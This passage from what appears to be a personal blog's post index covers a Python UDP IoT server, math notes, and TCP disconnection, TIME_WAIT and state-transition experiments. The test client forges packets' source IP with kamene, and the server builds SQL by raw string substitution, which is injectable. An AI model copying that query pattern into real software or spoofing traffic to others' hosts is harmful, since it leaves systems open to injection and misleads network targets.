self.cursor.fetchone(): try: self.cursor.execute(updatesql) self.db.commit() except: self.db.rollback() else: try: self.cursor.execute(insertsql) self.db.commit() except: self.db.rollback() def replace_params(self, line, mark, *params): for i in range(len(params)): line = str(line).replace(mark, params[i], 1) return line The Main Function The main creates the queue, the reception thread and the processor threads, finally goes to sleep to wait for joining all the threads. 123456789101112131415161718192021222324252627282930313233343536373839from queue import Queuefrom iot_reception import *from iot_processor import *def main(): # Global Configurations config = ConfigParser() config.read("server.config") threads_list = [] # Message Queue msg_queue = Queue() # Message Reception Thread thread = IOTMsgReception("ThreadIDReception", "ThreadReception", msg_queue, config.get("server", "ipaddress"), config.getint("server", "udpport"), config.getint("server", "buffersize")) threads_list.append(thread) thread.start() # Message Processing Threads for index in range(0, config.getint("concurrent", "process_thread_number")): thread = IOTMsgProcessor("ThreadIDProcessor" + str(index), "ThreadProcessor" + str(index), msg_queue) threads_list.append(thread) thread.start() # Join all the threads for index in range(0, len(threads_list)): threads_list[index].join()if __name__ == "__main__": main() Configuration File 1234567891011121314151617181920[db]host=172.17.237.168port=3306user=xxxxxxpass=xxxxxxname=NbIOTchar=utf8[server]ipaddress=udpport=9999buffersize=50[concurrent]process_thread_number=10[sql]search=SELECT * FROM NbIOT.IOTHardwareInUse where HardwareID='@PARAM@'update=UPDATE `NbIOT`.`IOTHardwareInUse` SET `Data`='@PARAM@' WHERE `HardwareID`='@PARAM@'insert=INSERT INTO `NbIOT`.`IOTHardwareInUse` (`HardwareID`, `Data`) VALUES ('@PARAM@', '@PARAM@') The Client Simulation For Test Pack a udp datagram and send it out, I was trying to fake the source IP address to make the data more real, but because of the existence of NAT, the source IP address has been changed when it arrives at the server. It’s all right for the simple test, so I’d like to just keep it like this. 1234567891011121314151617181920212223242526272829from kamene.all import *from kamene.layers.inet import IP, UDP# IP Layer# Actually it makes no sense to change the source ip addr, since there's NAT.srcip = "11.11.111.111"dstip = "47.95.194.185"iplayer = IP(src=srcip, dst=dstip)# UDP Layersrcport = random.randint(1024, 65535)dstport = [9999]udplayer = UDP(sport=srcport, dport=dstport)# APP Layer dataposition = ["DL", "SY", "BJ", "SH", "TK"]district = ["AA", "BB", "CC", "DD", "EE"]identify = ["00", "01", "02", "03", "04"]data_min = 10data_max = 40# Send 5 timesfor i in range(0, 5): prefix = position[random.randint(0, len(position) - 1)] + \ district[random.randint(0, len(district) - 1)] + \ identify[random.randint(0, len(identify) - 1)] surfix = str(random.randint(data_min, data_max)) message = prefix + ":" + surfix send(iplayer / udplayer / message)]]></content>
      <categories>
        <category>Network</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[一道小学6年级的数学题]]></title>
    <url>%2F2018-12-14-elementary-math-problem%2F</url>
    <content type="text"><![CDATA[已知圆的半径为4，等边三角形的边长为10，且图中三部分阴影部分面积相等，求阴影部分的面积。（6年级），这道六年级的数学题，小学六年级的知识肯定是不会做的，除非使用量角器，并且同时量出来的角度是90度，解这个题并不需要多深的数学知识，之所以记录下来是因为我自己解这道题时思考的顺序很有意思。 解法1: 初等三角 题中说明三个阴影部分面积相等，显然得出结论圆心与等边三角形中心重合（证明略），所以已知条件为，\(假设∠DoF=α，∠EoF=\frac{2π}{3}，∠DoE=\frac{2π}{3}-α，AD=x，DF=y，AB=10，r=4\) \(Sin(\frac{\frac{2}{3}π-α}{2})=\frac{\frac{x}{2}}{r}=\frac{x}{8}\) 方程1 \(Sin(\frac{α}{2})=\frac{\frac{y}{2}}{r}=\frac{y}{8}\) 方程2 \(2x+y=10\) 方程3 之后就是解这个方程组了，之前我错误的估计了方程组是比较难解的未知数耦合的非线性方程，其实最简单的三角函数展开就行了。 令\(β = \frac{α}{2}\)，方程组变为， \[sin(\frac{ π }{3}-β)=\frac{x}{8}，sinβ=\frac{y}{8}，2x+y=10\] 合并成一个方程 \[16sin(\frac{ π }{3}-β)+8sinβ=10\] 展开得到 \[8\sqrt{3}cosβ=10，α=2β=2arccos(\frac{5}{4\sqrt{3}})≈1.528（角度制87.59°），β=0.764，x≈2.231，y≈5.535\] 最终面积为 \[SB=3*(S_{扇形DoF}-S_{ΔDoF})=3*(πr^{2}*\frac{α}{2π}-\frac{1}{2}*r^{2}sinα)≈12.66\] 解法2: 定积分 简单粗暴，求面积\(3*(S_{EHMGI}-S_{EHGI})\)，此处坐标原点的选取对求解非常重要。选取不好积分非常难积。 \(S_{EHMGI}=\int_a^b f(x)dx=\int_a^b (-\sqrt{16-x^{2}})dx\) 其中a对应H的横坐标， b对应G的横坐标 设\[OJ=m，∠OBJ=\frac{π}{6}，OB=2m，BJ=5，计算得到，a=-\sqrt{\frac{23}{3}}，b=\sqrt{\frac{23}{3}}\] 以下就集中搞这个积分。 \[令x=4sin(u)，dx=4cos(u)du，u=arcsin(\frac{x}{4})\] \[-\int (\sqrt{16-x^{2}})dx=-\int{ }\sqrt{16-16sin^2u}·4cosudu=-16\int{ } cos^2udu\] 三角变换得 \[-16\int{ } cos^2udu=-8\int{ }(cos2u+1)du=-4sin(2u)-8u+c=-8sinu·cosu-8u+c\] 把\(u=arcsin(\frac{x}{4})\)带入得 \[-8sinu·cosu-8u+c=-2x\sqrt{1-\frac{x^{2}}{16}}-8arcsin\frac{x}{4}+c\] 最终求定积分为-20.22，则面积为\(S_{EHMGI}≈20.22\)，\(S_{EHGI}=OJ*2HJ=2\sqrt{\frac{25}{3}}\sqrt{\frac{23}{3}}≈15.99\)，最终面积约为12.69 解法3: 初中阶段三角函数定义 在求定积分的上下限时，其实已经直接可以算面积了。求得结果与第一种解法完全一样。10000点暴击。 \[OJ=\sqrt{\frac{25}{3}}，cos∠JoH=\frac{OJ}{OH}=\frac{5}{4\sqrt{3}}，∠JoH=arccos\frac{5}{4\sqrt{3}}≈0.764\]]]></content>
      <categories>
        <category>Math</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Fundamental theorem of calculus]]></title>
    <url>%2F2016-03-08-fundamental-theorem-of-calculus%2F</url>
    <content type="text"><![CDATA[Why the fundamental theorem of calculus is gorgeous? In the ancient history, it’s easy to calculate the areas like triangles, circles, rectangles or shapes which are consist of the previous ones, even some genius can calculate the area which is under a closed region of a parabola boundary by indefinitely exhaustive method. Actually it’s the calculation of integrals with the help of the definition of definite calculus. Such as we caculate the area bounded by the \(f(x)=x^2\), axis \(x\) and axis \(y\), which is OAB. Definition of definite calculus, we use this to stand for the area by the standard Leibniz notation. \[ \int_a^b f(x)dx = \lim_{\max\Delta x_k\to0}\sum_{k=1}^nf(x^*_k) \Delta x_k \] Assume the point B is \((b, 0)\), cut the \(OAB\) into n rectangles. The area of the first one is \((\frac{b}{n})(\frac{b}{n})^2\), the second is \((\frac{b}{n})(\frac{2b}{n})^2\) , and the nth is \((\frac{b}{n})(\frac{nb}{n})^2\) , so we have the S, apparently, \(\Delta x_k = \frac{b}{n}\) \[ S = (\frac{b}{n})(\frac{2b}{n})^2 + (\frac{b}{n})(\frac{nb}{n})^2 + ... + (\frac{b}{n})(\frac{nb}{n})^2 \] \[ S=(\frac{b^3}{n^3})(1^2+2^2+...+(n-1)^2+n^2) \] \[ S=(\frac{b^3}{n^3})(\frac{n(n+1)(2n+1)}{6})=b^3(\frac{1}{6}+\frac{1}{6n})(2+\frac{1}{n}) \] When \(\Delta x_k\to0, n\to\infty, S=\frac{b^3}{3}\). But what about the calculation of \(f(x)=x^5\), \(f(x)=cosx\), \(f(x)=(1+\frac{1}{x^5})\) , it’s not so easy with previous primary method to get the result. We have to use the fundamental theorem of calculation which is described as If \(f(x)\) is a continuous function on a closed interval \([a,b]\), \(F(x)\) is any antiderivative of \(f(x)\), in another word \(\int f(x)dx=F(x)+c\), then \(\int_a^b f(x)dx = F(b)-F(a)\). Now we have a weapon to solve the previous problem in a flash moment. \(\int_0^b x^2dx = F(b) = \frac{b^3}{3}\) How did the mathematicians get the FTC? (Fundamental theorem of calculus). Now we need to calculate the area between edge a and b, b is moving to the right, so the area A is a function of x, so we note the area \(A(x)\), so \(\Delta A(x)=A(x+\Delta x)-A(x)=f(\bar x)\Delta x\), so \(A&#39;(x)=f(x)\), which means \(A(x)=F(x)+c\), \(F(x)\) is a antidirevative of \(f(x)\). When edge a, b coincide, the area is 0, \(A(a)=0\), so we have \(A(a)=F(a)+c\) and \(c=-F(a)\), we get \(A(b) = \int_a^b f(x)dx = F(b) - F(a)\). When we need to calculate the area, we just need to find the indefinite integral first, then do some basic calculation. The FTC is a milestone in the development of mathematic.]]></content>
      <categories>
        <category>Math</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[TCP Abnormal Disconnection]]></title>
    <url>%2F2016-02-07-tcp-abnormal-connection%2F</url>
    <content type="text"><![CDATA[Actually there are two ways to release a TCP connection. The normal way to terminate a TCP connection is for one side to send a FIN segment, and it follows the normal releasing procedure. It’s also ok to send a segment which is called RST segment to release the connection immedietly. The difference between these two ways is that the normal release operation guarantee that the data transferred is reliable, the RST segment cut off the connection imedietly which mostly cause the data loss. Sometimes RST segment is involved into the communication software architecture on purpose, but most of the time when RST is caught in a network, it indicates that something goes wrong in the network. Experiment Network Topology Host IP addresses TCP port number Server 10.22.5.3 55555 Client 10.16.56.2 1982 Case 1: Connection not establishment, server process not start In this case , we presume that TCP/IP protocal stack is ok, the server process is not running, client sends the SYN to start connection request, SYN segment arrives at the TCP statck of the server. Case there’s no process listening on the specific port refering to the port in the SYN segment，the TCP layer can do nothing but reject the connection request. At this time, the server side TCP layer use the RST segment to response the SYN segment. After the client receive the RST, the TCP layer of the client will report to the application layer with the message “connect error: connection refused”. In the RST segment, besides the RST flag bit is set, the sequence number is set to 0, acknowledge number is equal “SYN Sequence number + 1”. Case 2: Send a RST segment with socket API As other segments, RST segment can be sent mannully with the socket API, 12345678Connect(sockfd, (SA *) &amp;servaddr, sizeof(servaddr));struct linger ling;ling.l_onoff = 1;ling.l_linger = 0;Setsockopt(sockfd, SOL_SOCKET, SO_LINGER, &amp;ling, sizeof(ling));Close(sockfd); Here is a wireshark packets capture, after the three handshake, the client send a RST segment. Case 3: Connection not establishment, server host not start It’s different from the server process not running, the server host is power off. At this moment, the server TCP stack is not ready at all. After the client sends the SYN request. SYN will mostly lost in the network, the packet will keep routing in the network. SYN will not acknowledged by the remote side, client tcp stack will resend the SYN for several times, and keep waiting some time between these resending operations. The time is twice as the last time waiting. e.g. client 10.22.5.3 start a connection to server 10.16.56.2, after seven failures, the connect() api report an error, “connect error: Connection timed out”. The time waiting sequence are 1s, 2s, 4s, 8s, 16s, 32s and the last 64s with an error to the application layer. And the total time of retrying is 6. the retries setting is differ according to the os kernels. The ubuntu is as this, 12toto@guru:~$ sysctl net.ipv4.tcp_syn_retries net.ipv4.tcp_syn_retries = 6 Case 4: Client process crashes If the client process crashes at different moments, it will result different consequences. For instance, the client process crashes at SYN_SENT status, the client sends a SYN and quits, the server process responses with SYN+ACK, waits for the will-never-received-ACK, the server tcp stack will start the retry procedure. If the client side does this deliberately, it is actually just another kind of SYN flood attacking. If the client process crash at ESTABLISHED status, the socket file descriptor of the client process will release by the client os kernel, and a FIN segment will be sent by tcp stack. Case 5: Connection established, server process crashes The server process crashes, all the file descriptors will be released by the server os kernel. And server will send a FIN to all the clients, client will answer an ACK, the unidirection pipe from the server to client is shut down. The server tcp status is FIN_WAIT2. The server stack is waiting for the FIN from the client. The client tcp status is CLOSE_WAIT, the client stack is waiting for the application layer to notify that there’s no more application data. The pipe from client to server is still keep opened. This is the TCP half-close situation. The client TCP is waiting for the EOF from application. if the client application layer doesn’t send an EOF to TCP layer, the client tcp stack will stuck in the CLOSE_WAIT status. At the same time, the server will stay in the FIN_WAIT2 for a few moment, and after timeout, the satus transit to CLOSED. 1234567//Servertoto@guru:~$ netstat -ant | grep 1982 tcp 0 0 10.22.5.3:1982 10.16.56.2:33383 FIN_WAIT2//Clienttoto@client:~$ netstat -ant | grep 1982tcp 0 0 10.16.56.2:33383 10.22.5.3:1982 CLOSE_WAIT When the server side is in FIN_WAIT2, if the client application call the function Write,which make the the message data arrive at the server tcp statck, but the server is expecting to get a FIN, so the server return a RST segment to the client to end the connection. The timer for FIN_WAIT2 could be manually set. 12toto@guru:~$ sysctl net.ipv4.tcp_fin_timeoutnet.ipv4.tcp_fin_timeout = 60 After the FIN_WAIT2 timer time out, check the status of both endpoints. 123456//Servertoto@guru:~$ netstat -ant | grep 1982 //Clienttoto@client:~$ netstat -ant | grep 1982tcp 0 0 10.16.56.2:33383 10.22.5.3:1982 CLOSE_WAIT Case 6: Connection not established, router crashes This case only discussed according to my topology, other situation should be considered according to the contexts. If the APR cache is still there, TCP SYN request will retry for several time, and at the end, an error message “connect error: Connection timed out” print out. If the ARP cache is cleared, the function Connect will return “connect error: No route to host”. Case 7: Connection established, router crashes In order to simulate this case. We run the server process, run client process in debug mode step by step to function Connect, after Connect return, the 3-way-handshake finishes. Checking both endpoints state are ESTABLISHED. At this moment, power off the router or disable the ports of the router to kill the network layer transportation. Check that both TCP endpoints state are still ESTABLISHED. The client calls function Write to send a request message. Write is not block, it will provide the application data to TCP stack and return immediatly, and the programme will block at Readline wating for the feedback from server. Now, the network layer is not working.TCP layer will retransmit the data. If the router is kept locking, the application message will never arrive at the server. If one of the host is powered off in this situation, the opponent will keep the TCP connection for ever, the resource will never be released. This is a situation called TCP half open. If there are too many half opened TCP connection on a server, the resources will run out. So the keep-alive mechanism is brought in.]]></content>
      <categories>
        <category>Network</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Approximation solutions of equation]]></title>
    <url>%2F2016-02-13-approximation-solution-of-equations%2F</url>
    <content type="text"><![CDATA[Consider the equation \(x^3-3x-5=0\), we can get the exact solution just as the quadratic equations. But it’s not easy to remember the formula. And for some equations like, \(x-cosx=0\), there’s even no way to get the analytic solutions. As an engineer, sometimes, we just require a acceptable numerical solution that is accurate to a reasonable number of decimal places. Plot the function Sketch the function \(f(x)=x^3-3x-5\) , the derivative of function \(f(x)\) is \(f&#39;(x)=3x^2-3\), x f(x) or f’(x) \(x=1 , x=-1\) \(f&#39;(x)=0\) \(x&lt;-1, x&gt;1\) \(f&#39;(x)&gt;0\) \(-1&lt;\)x\(&lt;1\) \(f&#39;(x)&lt;0\) \(x=-1\) \(f(x)=-3\) \(x=1\) \(f(1)=-7\) \(x=2\) \(f(2)=-3\) \(x=3\) \(f(3)=13\) The second derivative is \(f&#39;&#39;(x)=6x\), so the point \((0, -5)\) is the point of inflection, when x &lt; 0, the chart concave down, x &gt; 0, the chart concave up. \(f(2)=-3, f(3)=13 \Rightarrow x_{0} \in (2, 3)\), we start from the point \(x_{1}=3\), \[ f&#39;(x_{1})=\frac{f(x_{1})-0}{x_{1}-x_{2}} \Rightarrow x_{2}=x1-\frac{f(x_{1})}{f&#39;(x_{1})} \] \[ f&#39;(x_{2})=\frac{f(x_{2})-0}{x_{2}-x_{3}} \Rightarrow x_{3}=x2-\frac{f(x_{2})}{f&#39;(x_{2})} \] ​ \(...\) we get the x by multiple calculation of \(x_{n}\), \(x_{2}=2.458333\), \(x_{3}=2.294310\), \(x_{4}=2.279144\), \(x_{5}=2.279018\) and \(f(x_{5})=-0.000009\), and \(x_{5}\) is acceptable as the root of the equation.]]></content>
      <categories>
        <category>Math</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[TIME_WAIT state]]></title>
    <url>%2F2016-01-31-tcp-timewait-status%2F</url>
    <content type="text"><![CDATA[TIME_WAIT state is the most complicated status among the state transmit of TCP protocal, at first glance its existence is not nessesary, some of the optimization technique eliminate the TIME_WAIT state arbitrarily. But as a part of a protocal which has been applied for so many years, there must be some reason. At least , before eliminating it, we should know the details about it, just as Richard Stevens referred in his book, “Instead of trying to avoid the state, we should understand it”. So what is a TIME_WAIT state TCP endpoint waiting for? Why the endpoint transimit to this state? What’s the problems it brought us? Any way that we can keep away from these problems? How long does TIME_WAIT state last? According to TCP specification, once a endpoint is in the TIME_WAIT state, it recommend that the endpoint should stay in this state for 2MSL to make sure the remote endpoint receiving the last FIN segment as much as possible. Once a endpoint is in TIME_WAIT state, the endpoints defining that connection cannot be reused. 2MSL is [Maximum Segment Lifetime] × 2, most of the Linux systems define the MSL 30s. 2MSL is 1 minutes. As we known, The longest life time for a IP packets stay alive in the network is marked by TTL, and TTL is stand for the maximum hops, so there’s no close relationship between the MSL and TTL. In most version of the Linux kernel, MSL is hard coded, and the setting is 1 minutes. But there’s also some other operation system that provided the configuration interface for this value.（tcp.h） 12//include/net/tcp.h#define TCP_TIMEWAIT_LEN (60*HZ) /* how long to wait to destroy TIME-WAIT state, about 60 seconds */ Transmit to TIME_WAIT state According to the state transfermation of TCP protocal, the endpoint who initiate the FIN will enter the TIME_WAIT state, which means that no matter it’s a client or server, who sent FIN, who TIME_WAIT. But on the other hand, client and server play a totally different role during the communication process. In another word, whether the client or the server transmitting to TIME_WAIT first, will lead to different consequences for the communication. Here are some details. In case 1~3, it’s the client who initiates the FIN. In case 4~5, it’s the server who asks for disconnect first. Client initiates the FIN request first Case 1 Client initiates the FIN segment First, I start the server process, run the client to connect to the server and do the application request for twice. Actually, the client sends two FIN during this operations. After this, I run the netstat to observe the printouts. Printout on server 123456789101112#Server start, TCP porttoto@guru:~$ netstat -ant | grep 1982tcp 0 0 0.0.0.0:1982 0.0.0.0:* LISTEN#Client runs twice, the server side&apos;s printouttoto@guru:~$ server Receive message from client process on 10.16.56.2: request,hostnameReceive message from client process on 10.16.56.2: request,hostname#After client disconnect server for twice, the server tcp status.toto@guru:~$ netstat -ant | grep 1982tcp 0 0 0.0.0.0:1982 0.0.0.0:* LISTEN Printout on client 12345678910#Run the client twicetoto@ClientOS:~$ client 10.22.5.3 1982response,gurutoto@ClientOS:~$ client 10.22.5.3 1982response,guru#Check the tcp statustoto@ClientOS:~$ netstat -ant | grep 1982tcp 0 0 10.16.56.2:55725 10.22.5.3:1982 TIME_WAITtcp 0 0 10.16.56.2:55726 10.22.5.3:1982 TIME_WAIT The client process initiates FIN request for twice. Notice that, at the second time when the client connects to the server, it goes well, no rejection from the server. Because on the client the tcp port 55725 is time wait, the client os kernel assigns a brand new ephemeral port 55726 for the second connection. Most of the time, when the client raises a tcp connection request, a brand new client side port is assigned to the process. The ephemeral ports range is configurable. In Linux we can check it as this: 12toto@guru:~$ cat /proc/sys/net/ipv4/ip_local_port_range 32768 61000 This case indacates that if a client initiates a FIN to finish the tcp connection. It will not take any effect to the server side, also not take any effect to itself. But during the design activity of a communication software system, if plenty of tcp connections are required at a very short period, and disconnect at a very short time, the client sides ports will mostly be exhausted. This situation should be considered and avoided. The alternative ways like tcp long term connection, tcp connection pool, or RST to disconnect should be used. Case 2 Client side binding to a local port init the FIN We bind a client to a specific local port, 1234567//bind a port to the sockfdsscanf(argv[1], &quot;%d&quot;, &amp;srcport);struct sockaddr_in clientaddr;bzero(&amp;clientaddr, sizeof(clientaddr));clientaddr.sin_family = AF_INET;clientaddr.sin_port = htons((uint16_t)srcport);Bind(sockfd, (SA *) &amp;clientaddr, sizeof(clientaddr)); Modify the code, recompile and run the client twice. Server printout 123456#Server toto@guru:~$ netstat -ant | grep 1982tcp 0 0 0.0.0.0:1982 0.0.0.0:* LISTENtoto@guru:~$ server Receive message from client process on 10.16.56.2: request,hostname Client printout 12345678#Clienttoto@ClientOS:~$ client 55555 10.22.5.3 1982response,gurutoto@ClientOS:~$ client 55555 10.22.5.3 1982bind error: Address already in usetoto@ClientOS:~$ netstat -ant | grep 1982tcp 0 0 10.16.56.2:55555 10.22.5.3:1982 TIME_WAIT It indicates that once a tcp connection in TIME_WAIT state, it cannot be recreated. Case 3 Client side binding to a local port init a FIN to a server, then this client init another SYN request to a brand new server process Run two server processes seperately on the host 10.22.5.3 and host 10.16.56.2. On the host 10.16.56.2, run client twice, we expect to establish two tcp connections, one is {10.16.56.2，55555，10.22.5.3，1982}, the other is {10.16.56.2，55555，10.16.56.2，1982}, we assume the two connections will be established successfully. But actually not on Ubuntu linux. Client printout 1234567toto@ClientOS:~$ client 55555 10.22.5.3 1982response,gurutoto@ClientOS:~$ client 55555 10.16.56.2 1982bind error: Address already in usetoto@ClientOS:~$ netstat -ant | grep 1982tcp 0 0 10.16.56.2:55555 10.22.5.3:1982 TIME_WAIT Obviously, they are two different tcp connections. Ubuntu linux forbid the usage of port “55555” to start a connection. This is not reasonable. We can only wait for the time out, and init the second connection. Client printout 1234567toto@ClientOS:~$ client 55555 10.16.56.2 1982response,ClientOStoto@ClientOS:~$ client 55555 10.22.5.3 1982bind error: Address already in usetoto@ClientOS:~$ netstat -ant | grep 1982tcp 0 0 10.16.56.2:55555 10.16.56.2:1982 TIME_WAIT Server init the FIN request Case 4 Server init the FIN, then restart TIME_WAIT brings kinds of problem to the server, and it will have a much greater influence to the communication than TIME_WAIT on the client’s side. As a communication system engineer, the TIME_WAIT state on the server should bring our attention with a higher priority. Start the server process, connect to it with two different clients. The two connections established successfully. Kill the server. 123456789#Servertoto@guru:~$ netstat -ant | grep 1982tcp 0 0 0.0.0.0:1982 0.0.0.0:* LISTEN tcp 0 0 10.22.5.3:1982 10.16.56.2:55555 TIME_WAIT tcp 0 0 10.22.5.3:1982 10.16.56.2:55556 TIME_WAIT#Clienttoto@ClientOS:~$ netstat -ant | grep 1982～no output Try to restart the server, failed. 123#Servertoto@guru:~$ server bind error: Address already in use If the server init the FIN, the tcp endpoint on the server side enters the TIME_WAIT state. If a server is serving a huge amount of clients, all of the connections’ state will transmit to TIME_WAIT at that moment. Case 5 Server init the FIN, client which binding to a specific port init the SYN for twice Bind the client tcp port to 55555, connect the server twice. 1234567891011121314151617#Clienttoto@ClientOS:~$ client 55555 10.22.5.3 1982response,gurutoto@ClientOS:~$ client 55555 10.22.5.3 1982response,gurutoto@ClientOS:~$ netstat -ant | grep 1982～no output#Servertoto@guru:~$ server Receive message from client process on 10.16.56.2: request,hostnameReceive message from client process on 10.16.56.2: request,hostnametoto@guru:~$ netstat -ant | grep 1982tcp 0 0 0.0.0.0:1982 0.0.0.0:* LISTEN tcp 0 0 10.22.5.3:1982 10.16.56.2:55555 TIME_WAIT Observe the captured packets, notice the 8th packet marked black by wireshark, TCP port numbers resued,it tells that the TIME_WAIT tcp port on the server side doesn’t resist the connection request from the client. The TIME_WAIT tcp port can be reused at this situation. Why the TIME_WAIT required? Why setting the 2MSL? We assume there’s no TIME_WAIT, what will happen? Senario 1 Suppose it’s alowed to create two identical (4-tuple) tcp connection at the same time. The 2nd connection is an incarnation of the first one. If there are packets delayed during the first connection, but still alive until the incarnation connection is created. (Because the waiting time is not long enough to make sure the network discard the delayed packets.), this will bring some unknown errors into the network. Although it’s a event of small probability, there’s still possibilities. The protocal itself has already get some preventive measures to keep this situation from happenning. First, during 3 way handshakes, ISN is one of the measures, second, the client tcp port is assigned by the os kernel most of the time with an ephemeral port which ensures that a new connection to the same host with a different 4 tuple id. Senario 2 Suppose a tcp disconnection procedure is in processing. The client sends a FIN, receive a ACK. But the next FIN from the server or the last ACK sent to server is lost in the network. What will happen next if the client doesn’t wait for 2MSL? The server resends the FIN, and the client thinks that the communication is over, and answer a RST to the last FIN, the server will get a RST and think “Shit, this is not a successful communication”. Dealing with the problems TIME_WAIT brings Before optimization activities against TIME_WAIT, you should think it over, and consider every relevant details to ensure not bringing more additional problems. Stradegy 1 Change the TIME_WAIT time setting Refer to OS Manuals, there’s no setting in Ubuntu at the time this one is writing. Stradegy 2 Socket parameter SO_REUSEADDR After call the socket function, set the SO_REUSEADDR, the process will discard the TIME_WAIT state. 1234567891011121314151617int Socket(int family, int type, int protocol)&#123; int sockfd = 0; int optval = 1; // Get a socket if ((sockfd = socket(family, type, protocol)) &lt; 0)&#123; err_sys("socket error"); &#125; // Eliminates TIME_WAIT status if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, (const void *) &amp;optval, sizeof(int)) &lt; 0)&#123; return -1; &#125; return sockfd;&#125; Stradegy 3 Ensure the client send the first FIN Who send FIN first, who transmit to TIME_WAIT, there are extra resource hanging during this state. Comparing with clients, the resources on the server is much more expensive and valuable. Stradegy 4 Disconnection with RST No matter who sends the RST segment to disconnect, no one will transmit to TIME_WAIT, the TCP data structure will release at once. And we write some addtional code on the application layer to ensure that the communication is successful and effective. Stradegy 5 Change the parameter tcp_tw_reuse，tcp_tw_recycle Refer RFC1122, tcp_tw_reuse code，tcp_tw_recycle code for more information.]]></content>
      <categories>
        <category>Network</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[TCP state transmissions]]></title>
    <url>%2F2016-01-23-tcp-connection-status-transit%2F</url>
    <content type="text"><![CDATA[For every instance of a kind of item, in a specific period of time, the instance itself will stay in a specific status. Take a cell phone as example, it can be in IDLE status, ALERTING status, CONNECTED status etc. A process could be in CREATED, READY, BLOCKED, RUNNING, DEAD status. When specific events occur, the status of the item can be transfer from one to another. For a kind of items, we can talk about different kind of status from different point of view, or different dimensions. I notes the transmissions of TCP endpoints in this one. State transmission chart People usually use a state transmission diagram to describe the state transfermations of an item. Before sketching a diagram, there are something should be clarified. We must tell explicitly the item that we need to describe, list all the states during the whole transformation and the events that triger the transfermation. I still take the celll phone as example. The phone is the object which has IDLE, SHUTDOWN, ALERTING, CONNECTED states, the events trigering the transmission are shown with arrows. TCP endpoints state transmission TCP protocal discribe the communication from endpoint to endpoint. The tcp state tranmission diagram describe the endpoints’ state change. It actually the transmission ctronl block in the os kernel (in most conditions), from the application layer, we can treat it as the socket state transfermation. Let’s review a whole process of a tcp segment sending and receiving, the connection is initiated with 3 segments, then established, and shut down with 4 segments(normally). For each endpoint, as the tcp segment’s sending and receiving, the state is changing. I presume there’s no exception during the communication, and the change will be as following, The initial state for each points is CLOSED. After the server calls the function Accept(), and the state changes from the CLOSED to LISTEN, and stay in the LISTEN until a SYN from client is received. Sometime later, A client sends a [1.SYN] to request a connection. The state of the client tansmits from CLOSED to SYN_SENT, here, the client keeps wating for the end of the 3-way-handshake. After the [1.SYN] is received by the server, it will become SYN_RECEIVED, and responses with a [2.SYN，ACK], to answer the [1.SYN], and at the same time to request a connection from server to client. The client answers a [3.ACK], both of the endpoints become ESTABLISHED state, a connection has been established, the application layer data is sent back and forth. When either endpoint requires to cut the established connection, it will send a FIN, say, the client sends a [8.FIN] to finish the connection (Maybe the server initiate the release procedure), this action will drive the client going to the state FIN_WAIT_1, in which the client keeps waiting for the ACK from the counter point. The server side gets the [8.FIN], notices that there will be no more data from the client side. Server answers the [8.FIN] with an [9.ACK], transfer to the CLOSE_WAIT state to wait for the server application layer finishing sending application data. After getting the [9.ACK], client transfers from FIN_WAIT_1 to FIN_WAIT_2. In FIN_WAIT_2, the client is receiving data only, but will never send anything until the server sends a FIN. At last, the server sends a [10.FIN], the server waits for the lask ACK from the client, this state is LAST_ACK. The client acknowledges the [10.FIN] with [11.ACK] as known as the last ACK, and goes to the TIME_WAIT state. The server goes to the CLOSED state after getting the last ACK. After the TIME_WAIT timeouts, the client goes to the CLOSED state. When we combine the state tranfermation diagram, we get the one descripted in RFC793. TCP abnormal endpoints state transmission When we consider the RST segment, e.g. the client requests a connection to the server port, on which there’s no processing listening, the server answers with a RST, RST makes the client transfering to the CLOSED state. TCP simultaneous established connection When the endpoints request a connection to each other simultaneously. It’s acting like this, there’s no client or server now, they are both clients, or servers. State diagram, TCP simultineous shutdown connection Shutdown a connection simultineously on both sides. Sometimes, FIN and ACK are combined to send together. In this situation, there’s no CLOSING state. State diagram. Integrated TCP endpoints state transmission When we comblie above state transmission diagrams in different situation, we get a final version.]]></content>
      <categories>
        <category>Network</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Zombie Process In Linux]]></title>
    <url>%2F2016-01-16-linux-zombieprocess%2F</url>
    <content type="text"><![CDATA[In Linux, any process that ends up running becomes a zombie process within a certain period, so a single zombie process is not inherently harmful. Only when the number of zombie processes in the system continues to accumulate and not disappear, the safety of the system will be threatened, especially in important server systems, the potential harm of the zombie process requires our special attention. So why does zombie processe exist? How does this process occur? What will happen to the system when zombie processes accumulate in large Numbers? How to avoid the potential harm of zombie process? This article discusses the above issues and briefly summarizes the process control of Linux operating system. The theory and approach to zombie processes are applicable to Solaris, BSD, and the Linux family of operating systems that conform to POSIX standards. The life cycle of Linux Process In the Linux operating system, any Process is created by a previous existing process, which is called the parent process of the newly created process, and the newly created process is a child process. The only exception here is the init process, which is the first process loaded by the OS kernel. Init is the root of the process tree and the status of the init process can be seen using the pstree command. 123456789101112131415161718toto@guru:~$ pstreeinit─┬─ModemManager───2*[&#123;ModemManager&#125;] ├─NetworkManager─┬─dhclient │ ├─dnsmasq │ └─3*[&#123;NetworkManager&#125;] ├─accounts-daemon───2*[&#123;accounts-daemon&#125;] ├─acpid ... ├─cron ├─cups-browsed ... ├─kerneloops ├─lightdm─┬─Xorg───&#123;Xorg&#125; │ ├─lightdm─┬─init─┬─at-spi-bus-laun─┬─dbus-daemon │ │ │ │ └─3*[&#123;at-spi-bus-laun&#125;] │ │ │ ├─at-spi2-registr───&#123;at-spi2-registr&#125; ... ... ... ... └─wpa_supplicant There are several states throughout the lifecycle of a process, including running state, sleep state, pause state, and zombie state. Among them, running state is subdivided into ready state, kernel running state and user running state. sleep state is divided into interruptible sleep state and uninterruptible sleep state. The state transitions are as follows. Any process that creates another process needs to apply to the operating system, and after the application is approved, the new created process enters the ready state. The kernel loads and runs the new process. The process switches to the kernel running state and the user running state. When the process terminates, the process enters the zombie state and stays in the zombie state until its parent process recycles it. Other states are not covered in this article. It can be told from the state transition that the zombie state is a mandatory path that a process must go through, and the zombie process is the process in the zombie state. Process creation As mentioned earlier, any process that creates another processe requires an application to the operating system through a fork system call. When a process calls fork, the operating system kernel adds a new item to its progress table and allocates resources for the new item, including memory resources, file descriptors, and so on. From the user’s 